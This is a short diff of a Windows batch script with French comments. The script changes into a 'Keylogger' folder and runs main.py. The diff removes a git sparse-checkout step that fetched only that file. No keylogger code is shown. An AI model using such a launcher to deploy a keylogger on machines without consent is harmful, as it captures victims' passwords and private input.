@@ -48,18 +48,6 @@ if errorlevel 1 (
 )
 cd Keylogger
 
-REM Récupérer uniquement le fichier main.py
-echo Configuration pour récupérer main.py uniquement...
-git sparse-checkout init --cone
-git sparse-checkout set "main.py"
-if errorlevel 1 (
-    echo Échec de la récupération de main.py dans le dépôt. Vérifiez l'existence du fichier.
-    pause
-    exit /b
-) else (
-    echo main.py récupéré avec succès !
-)
-
 REM Exécuter le fichier main.py
 python main.py
 if errorlevel 1 (
